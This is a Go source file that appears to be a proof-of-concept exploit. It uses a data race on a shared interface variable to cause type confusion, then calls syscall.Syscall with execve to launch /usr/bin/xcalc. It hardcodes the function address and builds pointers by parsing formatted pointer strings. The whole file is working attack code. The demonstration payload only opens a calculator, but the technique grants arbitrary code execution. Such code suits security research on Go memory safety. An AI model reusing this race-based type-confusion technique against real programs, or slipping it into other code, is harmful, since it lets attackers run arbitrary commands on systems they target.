package main

import (
	"fmt"
)

type itf interface {
	X() bool
}

type safe struct {
	f *int
}

func (s *safe) X() bool {
	return false
}

type unsafe struct {
	f func(uintptr, uintptr, uintptr, uintptr) int
}

func (u *unsafe) X() bool {
	if u.f == nil {
		return false
	}

	// call syscall_Syscall with __NR_execve as syscall
	// and args to execute `xcalc`
	// #include <unistd.h>
	// int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
	u.f(
		59,
		address(binPath),
		address(argv),
		address(env),
	)

	return true
}

// interfaces for race
var good itf
var leak itf
var confused itf

func main() {
	// prepare binPath, argv, env for execve
	prepare_execve_args()

	// address of syscall.Syscall
	// may chchange in different systems
	addrOfFunc := 0x480d20

	// prepare interfaces implementation
	good = &safe{f: &addrOfFunc}
	leak = &unsafe{}
	confused = good

	go func() {
		//start the race
		for i := 0; i <= 100000; i++ {
			confused = leak
			confused = good
		}
	}()

	// we want confused to point to the type of unsafe (where func is)
	// but still have the value of safe (a pointer we control)
	for {
		confused.X()
	}
}

// strings for execve
var targetPath = "/usr/bin/xcalc"
var targetEnv = "DISPLAY=:0"
var binPath []uint8
var argv []uintptr
var env []uintptr

func prepare_execve_args() {
	binPath = make([]uint8, len(targetPath)+1)
	copy(binPath, targetPath)

	argv = make([]uintptr, 2)
	argv[0] = address(binPath)

	env0 := make([]uint8, len(targetEnv)+1)
	copy(env0, targetEnv)
	env = make([]uintptr, 2)
	env[0] = address(env0)
}

// retrieve address of of type
// no import version of
// reflect.ValueOf(i).Pointer()
func address(i interface{}) uintptr {
	ptr_str := fmt.Sprintf("%p", i)

	var val uint64

	for i := 2; i < len(ptr_str); i++ {
		val *= 0x10
		if '0' <= ptr_str[i] && ptr_str[i] <= '9' {
			cur_digit := ptr_str[i] - '0'
			val += uint64(cur_digit)
		} else {
			cur_digit := ptr_str[i] - 'a' + 10
			val += uint64(cur_digit)
		}
	}

	return uintptr(val)
}
